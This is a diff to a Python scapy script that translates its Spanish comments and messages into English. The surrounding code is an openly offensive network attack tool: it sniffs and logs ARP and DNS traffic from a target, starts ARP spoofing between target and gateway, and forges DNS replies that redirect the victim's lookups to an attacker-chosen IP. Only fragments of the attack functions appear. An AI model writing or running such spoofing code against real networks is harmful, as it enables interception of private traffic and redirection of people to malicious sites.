@@ -11,7 +11,7 @@ arp_log = "arp_log.txt"
 dns_log = "dns_log.txt"
 
 def write_log(log, data):
-    """ Escribe los datos capturados en un archivo de log """
+    """ Write the captured data to a log file """
     with open(log, "a") as file:
         file.write(data + "\n")
         
@@ -38,7 +38,7 @@ def get_interface():
     return iface
 
 def process_packet(packet):
-    """ Procesa los paquetes ARP y DNS """
+    """ Process the ARP and DNS packets """
     data = ""
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
@@ -56,10 +56,10 @@ def process_packet(packet):
         ip_src = packet[IP].src if packet.haslayer(IP) else "Unknown"
         ip_dst = packet[IP].dst if packet.haslayer(IP) else "Unknown"
         
-        if dns_layer.qr == 0 and dns_layer.qd:  # DNS Request
+        if dns_layer.qr == 0 and dns_layer.qd:  # DNS Query
             dns_query = dns_layer.qd.qname.decode('utf-8') if dns_layer.qd.qname else "Unknown"
             data = (
-                f"[{timestamp}] Request DNS:\n"
+                f"[{timestamp}] DNS Query:\n"
                 f"- Client: {ip_src}\n"
                 f"- Query: {dns_query}\n"
             )
@@ -74,7 +74,7 @@ def process_packet(packet):
             if not answers:
                 answers.append("No answers")
             data = (
-                f"[{timestamp}] Reply DNS:\n"
+                f"[{timestamp}] DNS Reply:\n"
                 f"- DNS Server: {ip_src}\n"
                 f"- IP Resolved: {answers}\n"
             )
@@ -129,14 +129,14 @@ def restore_dns():
     print("[+] DNS rules restored.")
 
 def arp_dns_sniffing(interface):
-    print(f"Iniciando captura de paquetes en {interface}... Presiona Ctrl + C para detener.")
+    print(f"[+] Starting packet capture on {interface}...")
     try:
         sniff(iface=interface, prn=process_packet, store=False)
     except KeyboardInterrupt:
         print(f"\n[!] Stop ARP and DNS Sniffing... Data stored in ", arp_log, "and", dns_log)
 
 def start_sniffing(interface, target_ip):
-    """ Starts an ARP Spoofing attack in a separate thread """
+    """ Starts an ARP and DNS Sniffing attack in a separate thread """
     print(f"[+] Launching ARP and DNS Sniffing on {interface} against {target_ip}...")
     threading.Thread(target=arp_dns_sniffing, args=(interface,)).start()
 
@@ -146,11 +146,11 @@ def start_arp_spoofing(target_ip, gateway_ip, interface):
     threading.Thread(target=arp_spoofing, args=(target_ip, gateway_ip, interface), daemon=True).start()
 
 def dns_spoofing(packet):
-    """ Escucha, intercepta y redirige las respuestas DNS a FAKE_IP """
-    if packet.haslayer(DNS) and packet.haslayer(IP) and packet[DNS].qr == 0:  # Request
+    """ Listen, intercept and redirect DNS responses to FAKE_IP """
+    if packet.haslayer(DNS) and packet.haslayer(IP) and packet[DNS].qr == 0:  # Query
         print(f"[+] Spoofing DNS request {packet[DNSQR].qname.decode()} to {FAKE_IP}")
 
-        # Crea la respuesta falsa
+        # Creates the fake response
         spoofed_packet = (
             IP(dst=packet[IP].src, src=packet[IP].dst) /
             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
@@ -168,7 +168,7 @@ def dns_spoofing(packet):
         print(f"[+] Redirecting {packet[DNSQR].qname.decode()} to {FAKE_IP}.")
 
 def start_dns_spoofing(interface, target_ip, fake_ip):
-    """ Escucha tráfico DNS en la interfaz especificada """
+    """ Listens for DNS traffic on the specified interface """
     print(f"[+] Launching DNS Spoofing against {target_ip}...")
     global FAKE_IP
     FAKE_IP = fake_ip
